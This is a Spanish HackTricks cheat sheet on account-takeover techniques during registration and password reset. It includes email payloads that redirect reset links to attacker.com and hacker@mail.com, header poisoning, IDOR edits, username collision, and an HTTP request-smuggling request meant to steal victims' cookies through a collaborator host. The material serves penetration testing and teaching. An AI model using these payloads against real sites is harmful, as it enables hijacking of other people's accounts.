# Vulnerabilidades de Registro y Toma de Control

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n [**art√≠culos oficiales de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) es un motor de b√∫squeda alimentado por la **dark web** que ofrece funcionalidades **gratuitas** para verificar si una empresa o sus clientes han sido **comprometidos** por **malwares robadores**.

El objetivo principal de WhiteIntel es combatir tomas de control de cuentas y ataques de ransomware resultantes de malwares que roban informaci√≥n.

Puedes visitar su sitio web y probar su motor de forma **gratuita** en:

{% embed url="https://whiteintel.io" %}

---

## Toma de Control de Registro

### Registro Duplicado

* Intenta generar usando un nombre de usuario existente
* Verifica variando el correo electr√≥nico:
  * may√∫sculas
  * \+1@
  * agregar puntos en el correo
  * caracteres especiales en el nombre del correo (%00, %09, %20)
  * Coloca caracteres negros despu√©s del correo: `test@test.com a`
  * victim@gmail.com@attacker.com
  * victim@attacker.com@gmail.com

### Enumeraci√≥n de Usuario

Verifica si puedes determinar si un nombre de usuario ya ha sido registrado dentro de la aplicaci√≥n.

### Pol√≠tica de Contrase√±a

Al crear un usuario, verifica la pol√≠tica de contrase√±as (verifica si se pueden usar contrase√±as d√©biles).\
En ese caso, puedes intentar fuerza bruta con credenciales.

### Inyecci√≥n SQL

[**Verifica esta p√°gina** ](sql-injection/#insert-statement)para aprender c√≥mo intentar tomas de control de cuentas o extraer informaci√≥n a trav√©s de **Inyecciones SQL** en formularios de registro.

### Toma de Control de Oauth

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### Vulnerabilidades de SAML

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### Cambio de Correo Electr√≥nico

Despu√©s de registrarte, intenta cambiar el correo electr√≥nico y verifica si este cambio se valida correctamente o si se puede cambiar a correos electr√≥nicos arbitrarios.

### M√°s Verificaciones

* Verifica si puedes usar **correos electr√≥nicos desechables**
* Una **contrase√±a larga** (>200) conduce a una **Denegaci√≥n de Servicio (DoS)**
* **Verifica los l√≠mites de velocidad en la creaci√≥n de cuentas**
* Utiliza username@**burp\_collab**.net y analiza el **callback**

## **Toma de Control de Restablecimiento de Contrase√±a**

### Fuga de Token de Restablecimiento de Contrase√±a a trav√©s del Referente <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Solicita restablecer la contrase√±a a tu direcci√≥n de correo electr√≥nico
2. Haz clic en el enlace de restablecimiento de contrase√±a
3. No cambies la contrase√±a
4. Haz clic en cualquier sitio web de terceros (por ejemplo: Facebook, Twitter)
5. Intercepta la solicitud en el proxy de Burp Suite
6. Verifica si el encabezado de referente est√° filtrando el token de restablecimiento de contrase√±a.

### Envenenamiento de Restablecimiento de Contrase√±a <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercepta la solicitud de restablecimiento de contrase√±a en Burp Suite
2. Agrega o edita los siguientes encabezados en Burp Suite: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Reenv√≠a la solicitud con el encabezado modificado\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Busca una URL de restablecimiento de contrase√±a basada en el _encabezado de host_ como: `https://attacker.com/reset-password.php?token=TOKEN`

### Restablecimiento de Contrase√±a a trav√©s del Par√°metro de Correo Electr√≥nico <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR en Par√°metros de API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. El atacante debe iniciar sesi√≥n con su cuenta e ir a la funci√≥n **Cambiar contrase√±a**.
2. Iniciar Burp Suite y interceptar la solicitud.
3. Enviarla a la pesta√±a de repetidor y editar los par√°metros: ID de usuario/correo electr√≥nico\
`powershell POST /api/changepass [...] ("form": {"email":"victima@email.com","password":"contrase√±asegura"})`

### Token D√©bil de Reinicio de Contrase√±a <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

El token de reinicio de contrase√±a debe generarse aleatoriamente y ser √∫nico cada vez.\
Intenta determinar si el token expira o si siempre es el mismo, en algunos casos, el algoritmo de generaci√≥n es d√©bil y puede ser adivinado. Las siguientes variables podr√≠an ser utilizadas por el algoritmo.

* Marca de tiempo
* ID de usuario
* Correo electr√≥nico del usuario
* Nombre y apellido
* Fecha de nacimiento
* Criptograf√≠a
* Solo n√∫meros
* Secuencia de token peque√±a (caracteres entre \[A-Z,a-z,0-9])
* Reutilizaci√≥n de token
* Fecha de vencimiento del token

### Fuga de Token de Reinicio de Contrase√±a <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Desencadena una solicitud de reinicio de contrase√±a utilizando la API/UI para un correo electr√≥nico espec√≠fico, por ejemplo: test@mail.com
2. Inspecciona la respuesta del servidor y busca `resetToken`
3. Luego usa el token en una URL como `https://ejemplo.com/v3/usuario/contrase√±a/reset?resetToken=[EL_RESET_TOKEN]&email=[EL_CORREO]`

### Reinicio de Contrase√±a a Trav√©s de Colisi√≥n de Nombre de Usuario <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Reg√≠strate en el sistema con un nombre de usuario id√©ntico al del usuario v√≠ctima, pero con espacios en blanco insertados antes y/o despu√©s del nombre de usuario. por ejemplo: `"admin "`
2. Solicita un reinicio de contrase√±a con tu nombre de usuario malicioso.
3. Utiliza el token enviado a tu correo electr√≥nico y restablece la contrase√±a de la v√≠ctima.
4. Con√©ctate a la cuenta de la v√≠ctima con la nueva contrase√±a.

La plataforma CTFd era vulnerable a este ataque.\
Ver: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Toma de Control de Cuenta a Trav√©s de Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Encuentra un XSS dentro de la aplicaci√≥n o un subdominio si las cookies est√°n limitadas al dominio principal: `*.dominio.com`
2. Filtra la **cookie de sesi√≥n** actual
3. Autent√≠cate como el usuario utilizando la cookie

### Toma de Control de Cuenta a Trav√©s de HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Utiliza **smuggler** para detectar el tipo de HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Crea una solicitud que sobrescribir√° el `POST / HTTP/1.1` con los siguientes datos:\
`GET http://algo.burpcollaborator.net HTTP/1.1 X:` con el objetivo de redirigir a las v√≠ctimas a burpcollab y robar sus cookies\
3. La solicitud final podr√≠a verse as√≠:
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
### Explotaci√≥n de este bug reportado en Hackerone\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Toma de control de cuenta a trav√©s de CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Crear un payload para CSRF, por ejemplo: "Formulario HTML con env√≠o autom√°tico para cambio de contrase√±a"
2. Enviar el payload

### Toma de control de cuenta a trav√©s de JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

El Token JSON Web podr√≠a ser utilizado para autenticar a un usuario.

* Editar el JWT con otro ID de usuario / Email
* Verificar una firma JWT d√©bil

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## Referencias

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)


## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) es un motor de b√∫squeda alimentado por la **dark web** que ofrece funcionalidades **gratuitas** para verificar si una empresa o sus clientes han sido **comprometidos** por **malwares robadores**.

El objetivo principal de WhiteIntel es combatir tomas de control de cuenta y ataques de ransomware resultantes de malwares que roban informaci√≥n.

Puedes visitar su sitio web y probar su motor de forma **gratuita** en:

{% embed url="https://whiteintel.io" %}


<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
